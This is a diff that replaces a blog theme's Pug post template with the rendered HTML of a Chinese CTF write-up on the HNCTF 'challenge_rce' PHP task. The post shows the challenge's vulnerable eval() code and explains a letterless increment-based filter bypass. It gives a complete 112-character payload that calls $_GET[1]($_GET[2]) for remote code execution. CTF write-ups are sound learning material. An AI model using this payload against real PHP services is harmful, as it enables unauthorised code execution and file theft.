@@ -1,107 +1,48 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[HNCTF] challenge_rce | Boogiepop Don't Laugh</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Boogiepop Don't Laugh" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HNCTF] challenge_rce</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-10-02T05:00:12.800Z" id="date"> 2022-10-02</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2022-10-02T05:28:04.516Z" id="updated"> 2022-10-02</time></div></span></div></div><hr><div id="post-content"><h2 id="启"><a href="#启" class="headerlink" title="启"></a>启</h2><p>进入页面，茫茫人海，空白一片，打开源代码发现：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002130248720.png" alt="image-20221002130248720"></p>
+<p>你在提示我什么呢，你提示了但是没有完全提示，误打误撞发现只要get传入一个hint参数即可显示源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$rce</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$rce</span>) &lt;= <span class="number">120</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$rce</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;Are you hack me?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;I want string!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too long!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-block content
-  -
-    const prev = page.prev
-    const next = page.next
-    const dateConf = theme.post.date
-    const updatedConf = theme.post.updated
-    const excerptConf = theme.post.excerpt
-    const reward = theme.post.reward
-    const encrypted = page.encrypt || page.password
-    const tocContent = encrypted === undefined ? toc(page.content, theme.toc) : toc(page.origin, theme.toc)
-    const countWord = theme.post.count === true && wordcount !== undefined ? wordcount(page.content) : null
-    const countTime = theme.post.time === true && min2read !== undefined ? min2read(page.content) : null
-  #post-bg
-    #post-title
-      h1= page.title
-      if (dateConf || updatedConf) && page.published
-        #post-info
-          - var first = true
-          if dateConf
-            span #{__('post.posted')}
-              div.control
-                time(datetime=page.date.toJSON())#date
-                  = ' ' + date(page.date, date_format)
-            - first = false
-          if updatedConf
-            if !first
-              br
-            span #{__('post.edited')}
-              div.control
-                time(datetime=page.updated.toJSON())#updated
-                  = ' ' + date(page.updated, date_format)
-            - first = false
-          if countWord
-            if !first
-              br
-            span #{__('post.countTotal')}
-              div.control #{countWord}
-            - first = false
-          if countTime
-            if !first
-              br
-            span #{__('post.timeTotal')}
-              div.control #{countTime} #{__('post.timeUnit')}
-    hr
-    #post-content
-      if excerptConf || encrypted
-        != page.content
-      else
-        != page.more
-      #paginator!= paginator()
-    #post-footer
-      if prev || next
-        - let fix = ""
-        if prev === undefined
-          - fix = "justify-content: flex-end"
-        if next === undefined
-          - fix = "justify-content: flex-start"
-        #pages(style=fix)
-          if prev !== undefined
-            .footer-link(style="width: 50%;text-align:right;border-right:1px #fe2 solid")
-              a(href=url_for(prev.path))
-                |← Next
-                = ' ' + prev.title
-          if next !== undefined
-            .footer-link(style="width: 50%;right:1px;border-left:1px #fe2 solid")
-              a(href=url_for(next.path))
-                = next.title + ' '
-                |Prev →
-    if reward
-      details#reward
-        summary #{__('post.reward')}
-        each imgSrc, pay in reward
-          div
-            span #{pay}
-            br
-            img(src=config.root + imgSrc)
-    -
-      let count = (theme.valine.enable === true) +
-                  (theme.gitalk.enable === true) +
-                  (theme.waline.enable === true)
-    if page.comments && count
-      #comments
-        if count > 0
-          .selector
-            if theme.valine.enable === true
-              button.valine-sel
-            if theme.gitalk.enable === true
-              button.gitalk-sel
-            if theme.waline.enable === true
-              button.waline-sel
-        if theme.valine.enable === true
-          #valine
-        if theme.gitalk.enable === true
-          #gitalk
-        if theme.waline.enable === true
-          #waline
+<p>这个过滤可谓是惊天地泣鬼神，通过验证，preg_match中可用字符为：</p>
+<p><code>1-9</code>,<code>,</code>,<code>+</code>,<code>=</code>,<code>$</code>,<code>_</code>,<code>()</code>,<code>;</code>,<code>.</code>,<code>[]</code>,<code>&#123;&#125;</code></p>
+<p>我们该如何利用这么一点东西去构造payload，进行rce呢？</p>
+<h2 id="思"><a href="#思" class="headerlink" title="思"></a>思</h2><p>众所周知无字母数字RCE的办法不外乎就四种，<code>取反</code>，<code>按位异或</code>，<code>自增</code>，<code>POC上传文件</code>，这里取反和异或给ban了，上传文件需要system函数，所以只能使用自增</p>
+<p>自增的原理就是当变量为字符串时，他可以通过自增的方法来改变数值，如</p>
+<p><code>$a=&#39;A&#39;;$a++;echo $a;</code></p>
+<p>上述语句就会输出B,这就是自增的原理，如果我们有了一个字母A，理论上是不是可以通过自增来获取所有字符串？，这是可行的，但是有一点需要注意<code>strlen($rce) &lt;= 120</code>，这也是比较恶心的一个点，需要考虑一下你的字符串长度，所以我们自增的时候必须尽量缩短的我们的长度</p>
+<h2 id="结"><a href="#结" class="headerlink" title="结"></a>结</h2><p>那么我们现在就来构造payload：</p>
+<p>首先可以本地测试一下<code>$_=[]._</code>,这样的话$_就等于字符串的’Array_‘:</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002131334202.png" alt="image-20221002131334202"></p>
+<p>这样的话就通过<code>$_=([]._)&#123;0&#125;</code>来获取第一个字母’A’：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002131430506.png" alt="image-20221002131430506"></p>
+<p>这样我们就得到了A，接下来就通过递增来构造payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=([]._)&#123;<span class="number">0</span>&#125;; <span class="comment">//A</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_1</span>=++<span class="variable">$_</span>;  <span class="comment">//$_1=C</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_1</span>.=++<span class="variable">$_</span>.([]._)&#123;<span class="number">1</span>&#125;; <span class="comment">//$_1=CHr</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_1</span>(<span class="number">71</span>).<span class="variable">$_1</span>(<span class="number">69</span>).<span class="variable">$_1</span>(<span class="number">84</span>); <span class="comment">//$_=_GET</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">1</span>](<span class="variable">$$_</span>[<span class="number">2</span>]); <span class="comment">//$_GET[1]($_GET[2])</span></span><br><span class="line"><span class="comment">//缩短为一行</span></span><br><span class="line"><span class="variable">$_</span>=([]._)&#123;<span class="number">0</span>&#125;;<span class="variable">$_</span>++;<span class="variable">$_1</span>=++<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_1</span>.=++<span class="variable">$_</span>.([]._)&#123;<span class="number">1</span>&#125;;<span class="variable">$_</span>=_.<span class="variable">$_1</span>(<span class="number">71</span>).<span class="variable">$_1</span>(<span class="number">69</span>).<span class="variable">$_1</span>(<span class="number">84</span>);<span class="variable">$$_</span>[<span class="number">1</span>](<span class="variable">$$_</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
 
-block aside-block
-  - 
-    const encrypted = page.encrypt || page.password
-    const tocContent = encrypted === undefined ? toc(page.content, theme.toc) : toc(page.origin, theme.toc)
-  if (tocContent.length > 0)
-    #toc-div(style=encrypted !== undefined?"display:none":"")
-      h1 #{__('post.index')}
-      |!{tocContent}
+<p>长度一共为112，所以是比较极限的了，这里假如不构造CHr的话，那么自增下去字符串就会超过120，这也是本题的一个妙处，然后把payload传入时要URL编码，因为+有特殊意义：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002132117373.png" alt="image-20221002132117373"></p>
+<p>这边就成功RCE了，接下来一步步读取文件即可：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002132740415.png" alt="image-20221002132740415"></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002132755036.png" alt="image-20221002132755036"></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/10/03/CTFSHOW-XSS/">← Next CTFSHOW-XSS</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/10/02/%5Bsuctf%202019%5DEasySQL/">[SUBCTF 2019] EasySQL Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Boogipop</a></h1><div id="description"><p>Are you still in pain?</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF"><span class="toc-number">1.</span> <span class="toc-text">启</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D"><span class="toc-number">2.</span> <span class="toc-text">思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">结</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
